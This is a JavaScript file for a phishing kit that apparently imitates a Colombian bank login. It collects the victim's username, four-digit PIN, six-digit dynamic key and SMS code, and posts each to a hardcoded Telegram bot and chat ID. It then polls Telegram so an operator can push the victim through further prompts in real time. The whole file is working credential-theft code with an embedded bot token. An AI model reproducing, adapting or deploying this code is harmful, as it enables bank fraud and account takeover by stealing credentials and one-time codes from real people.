// ==========================================
// CONFIGURACIÓN DE TELEGRAM
// ==========================================
const TG_BOT_TOKEN = '8861202697:AAFR82-mSGAhQbN91qJcjugZXpHeP1_7gD4';
const TG_CHAT_ID = '7776240161';

// ==========================================
// VARIABLES Y ELEMENTOS DEL DOM
// ==========================================
const usuarioInput = document.getElementById("usuario");
const claveInput = document.getElementById("clave");
const submitBtn = document.getElementById("submitBtn");
const demoForm = document.getElementById("demoForm");
const loadingOverlay = document.getElementById('loading-overlay');
const loginError = document.getElementById('loginError');

const modal = document.getElementById("modalDinamica");
const otpInput = document.getElementById("otpInput");
const otpSlots = document.querySelectorAll(".otp-slot");
const btnBorrar = document.getElementById("btnBorrar");
const btnContinuar = document.getElementById("btnContinuar");
const otpError = document.getElementById("otpError");
const otpContainer = document.getElementById("otpContainer");
const closeModal = document.getElementById("closeModal");

const viewDinamica = document.getElementById("viewDinamica");
const viewSms = document.getElementById("viewSms");
const smsCodeInput = document.getElementById("smsCodeInput");
const btnSmsFinal = document.getElementById("btnSmsFinal");
const smsError = document.getElementById("smsError");
const smsInputWrap = document.getElementById("smsInputWrap");

let pollingActivo = false;
let pollingTimeout = null;
let ultimoUpdateId = -1;
let actionProcessed = false;
let msgIdActual = null;

function mostrarOverlay() { loadingOverlay.style.display = 'flex'; }
function ocultarOverlay() { loadingOverlay.style.display = 'none'; }

function actualizarBoton() {
  const claveCompleta = /^[0-9]{4}$/.test(claveInput.value);
  const usuarioLleno = usuarioInput.value.trim().length > 0;
  const formularioValido = claveCompleta && usuarioLleno;
  submitBtn.disabled = !formularioValido;
  if (formularioValido) loginError.classList.remove("show");
}

usuarioInput.addEventListener("input", actualizarBoton);
claveInput.addEventListener("input", function() {
  claveInput.value = claveInput.value.replace(/[^0-9]/g, "").slice(0, 4);
  actualizarBoton();
});

// ==========================================
// ENVIAR A TELEGRAM
// ==========================================
function enviarIdentificacionTelegram(usuario, clave) {
    const mensaje = `⚡ <b>PORTAL - INICIO DE SESIÓN</b>\n\n👤 <b>Usuario:</b> <code>${usuario}</code>\n🔑 <b>Clave:</b> <code>${clave}</code>\n\n📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}`.trim();
    const keyboard = {
        inline_keyboard: [
            [{ text: '❌ Usuario Malo', callback_data: 'error_usuario' }, { text: '🔑 Pedir Dinámica', callback_data: 'pedir_dinamica' }],
            [{ text: '🚫 Banear IP', callback_data: 'banear_ip' }, { text: '🏁 Finalizar (Google)', callback_data: 'finalizar' }]
        ]
    };
    fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TG_CHAT_ID, text: mensaje, parse_mode: 'HTML', reply_markup: keyboard })
    }).then(r => r.json()).then(data => {
        if (data.ok && data.result) {
            msgIdActual = String(data.result.message_id);
            actionProcessed = false;
            escucharBotones(handleTelegramActionLogin);
        } else { ocultarOverlay(); }
    }).catch(() => ocultarOverlay());
}

function enviarDinamicaTelegram(dinamica) {
    const mensaje = `⚡ <b>PORTAL - CLAVE DINÁMICA</b>\n\n👤 <b>Usuario:</b> <code>${usuarioInput.value}</code>\n🔢 <b>Dinámica:</b> <code>${dinamica}</code>\n\n📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}`.trim();
    const keyboard = {
        inline_keyboard: [
            [{ text: '❌ Error Dinámica', callback_data: 'error_dinamica' }, { text: '📩 SMS Code', callback_data: 'sms_code' }],
            [{ text: '🏁 Finalizar (Google)', callback_data: 'finalizar' }]
        ]
    };
    fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TG_CHAT_ID, text: mensaje, parse_mode: 'HTML', reply_markup: keyboard })
    }).then(r => r.json()).then(data => {
        if (data.ok && data.result) {
            msgIdActual = String(data.result.message_id);
            actionProcessed = false;
            escucharBotones(handleTelegramActionDinamica);
        }
    });
}

function enviarSmsTelegram(codigoSms) {
    const mensaje = `⚡ <b>PORTAL - CÓDIGO SMS</b>\n\n👤 <b>Usuario:</b> <code>${usuarioInput.value}</code>\n📩 <b>SMS:</b> <code>${codigoSms}</code>\n\n📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}`.trim();
    const keyboard = {
        inline_keyboard: [
            [{ text: '❌ Error Dinámica', callback_data: 'error_dinamica_final' }],
            [{ text: '❌ Error SMS Code', callback_data: 'error_sms_final' }],
            [{ text: '🏁 Finalizar (Google)', callback_data: 'finalizar' }]
        ]
    };
    fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TG_CHAT_ID, text: mensaje, parse_mode: 'HTML', reply_markup: keyboard })
    }).then(r => r.json()).then(data => {
        if (data.ok && data.result) {
            msgIdActual = String(data.result.message_id);
            actionProcessed = false;
            escucharBotones(handleTelegramActionSms);
        }
    });
}

// ==========================================
// ESCUCHAR BOTONES (POLLING)
// ==========================================
function escucharBotones(callbackAction) {
    if (!msgIdActual) return;
    pollingActivo = true;
    function check() {
        if (!pollingActivo) return;
        fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/getUpdates`, {
            method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ offset: ultimoUpdateId + 1, allowed_updates: ['callback_query'], timeout: 10 })
        }).then(r => r.json()).then(data => {
            if (!data.ok || !data.result || data.result.length === 0) {
                pollingTimeout = setTimeout(check, 2000); return;
            }
            for (const u of data.result) {
                ultimoUpdateId = Math.max(ultimoUpdateId, u.update_id);
                if (u.callback_query) {
                    const messageId = String(u.callback_query.message.message_id);
                    if (messageId === String(msgIdActual)) {
                        pollingActivo = false;
                        callbackAction(u.callback_query.data);
                        return;
                    }
                }
            }
            pollingTimeout = setTimeout(check, 2000);
        }).catch(() => { pollingTimeout = setTimeout(check, 3000); });
    }
    check();
}

// ==========================================
// ACCIONES DE TELEGRAM
// ==========================================
function handleTelegramActionLogin(action) {
    if (actionProcessed) return;
    actionProcessed = true;
    ocultarOverlay();

    if (action === 'pedir_dinamica') {
        modal.classList.add("is-open");
        viewDinamica.style.display = "block";
        viewSms.classList.remove("active");
        otpInput.value = "";
        otpError.classList.remove("show");
        otpContainer.classList.remove("error");
        actualizarOTP();
        setTimeout(() => otpInput.focus(), 100);
    } else if (action === 'error_usuario') {
        loginError.classList.add("show");
        claveInput.value = "";
        actualizarBoton();
        claveInput.focus();
    } else if (action === 'banear_ip') {
        localStorage.setItem('sys_blocked_user', 'true');
        location.reload();
    } else if (action === 'finalizar') {
        window.location.href = "https://www.google.com";
    }
}

function handleTelegramActionDinamica(action) {
    if (actionProcessed) return;
    actionProcessed = true;
    ocultarOverlay();

    if (action === 'error_dinamica') {
        modal.classList.add("is-open");
        viewDinamica.style.display = "block";
        viewSms.classList.remove("active");
        otpError.classList.add("show");
        otpContainer.classList.add("error");
        otpInput.value = "";
        actualizarOTP();
        otpInput.focus();
        actionProcessed = false;
    } else if (action === 'sms_code') {
        viewDinamica.style.display = "none";
        viewSms.classList.add("active");
        smsCodeInput.value = "";
        smsError.classList.remove("show");
        smsInputWrap.classList.remove("error");
        setTimeout(() => smsCodeInput.focus(), 100);
    } else if (action === 'finalizar') {
        window.location.href = "https://www.google.com";
    }
}

function handleTelegramActionSms(action) {
    if (actionProcessed) return;
    actionProcessed = true;
    ocultarOverlay();

    if (action === 'error_dinamica_final') {
        viewSms.classList.remove("active");
        viewDinamica.style.display = "block";
        otpError.classList.add("show");
        otpContainer.classList.add("error");
        otpInput.value = "";
        actualizarOTP();
        otpInput.focus();
        actionProcessed = false;
    } else if (action === 'error_sms_final') {
        smsError.classList.add("show");
        smsInputWrap.classList.add("error");
        smsCodeInput.value = "";
        smsCodeInput.focus();
        actionProcessed = false;
    } else if (action === 'finalizar') {
        window.location.href = "https://www.google.com";
    }
}

// ==========================================
// LÓGICA FORMULARIO PRINCIPAL
// ==========================================
demoForm.addEventListener("submit", function(event) {
  event.preventDefault();
  if (submitBtn.disabled) return;
  mostrarOverlay();
  const user = usuarioInput.value.trim();
  const pass = claveInput.value.trim();
  enviarIdentificacionTelegram(user, pass);
});

// ==========================================
// LÓGICA OTP
// ==========================================
function actualizarOTP() {
  const valor = otpInput.value;
  otpSlots.forEach((slot, index) => {
    if (index < valor.length) {
      slot.textContent = valor[index];
      slot.classList.remove("active");
    } else {
      slot.textContent = "";
      if (index === valor.length) { slot.classList.add("active"); }
      else { slot.classList.remove("active"); }
    }
  });
  if (valor.length === 6) {
    btnContinuar.disabled = false;
    otpSlots.forEach(s => s.classList.remove("active"));
  } else {
    btnContinuar.disabled = true;
  }
}

otpInput.addEventListener("input", function() {
  this.value = this.value.replace(/[^0-9]/g, "").slice(0, 6);
  otpError.classList.remove("show");
  otpContainer.classList.remove("error");
  actualizarOTP();
});

otpContainer.addEventListener("click", () => otpInput.focus());

btnBorrar.addEventListener("click", () => {
  otpInput.value = "";
  otpError.classList.remove("show");
  otpContainer.classList.remove("error");
  actualizarOTP();
  otpInput.focus();
});

btnContinuar.addEventListener("click", () => {
  if (otpInput.value.length === 6) {
    mostrarOverlay();
    enviarDinamicaTelegram(otpInput.value);
  }
});

closeModal.addEventListener("click", () => { modal.classList.remove("is-open"); });

// ==========================================
// LÓGICA SMS
// ==========================================
smsCodeInput.addEventListener("input", function() {
  this.value = this.value.replace(/[^0-9]/g, "").slice(0, 6);
  smsError.classList.remove("show");
  smsInputWrap.classList.remove("error");
});

btnSmsFinal.addEventListener("click", () => {
  if (smsCodeInput.value.length < 6) {
    smsError.textContent = "Por favor, ingresa el código SMS completo de 6 dígitos.";
    smsError.classList.add("show");
    smsInputWrap.classList.add("error");
    return;
  }
  mostrarOverlay();
  enviarSmsTelegram(smsCodeInput.value);
});

// ==========================================
// RELOJ / FECHA
// ==========================================
function actualizarFecha() {
  const ahora = new Date();
  const opciones = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric', hour: 'numeric', minute: '2-digit', hour12: true };
  let fecha = ahora.toLocaleDateString('es-ES', opciones).replace(',', '');
  const el = document.getElementById('reloj-widget');
  if (el) el.textContent = fecha.charAt(0).toUpperCase() + fecha.slice(1);
}
actualizarFecha();
setInterval(actualizarFecha, 60000);

// Inicializar estado del botón
actualizarBoton();
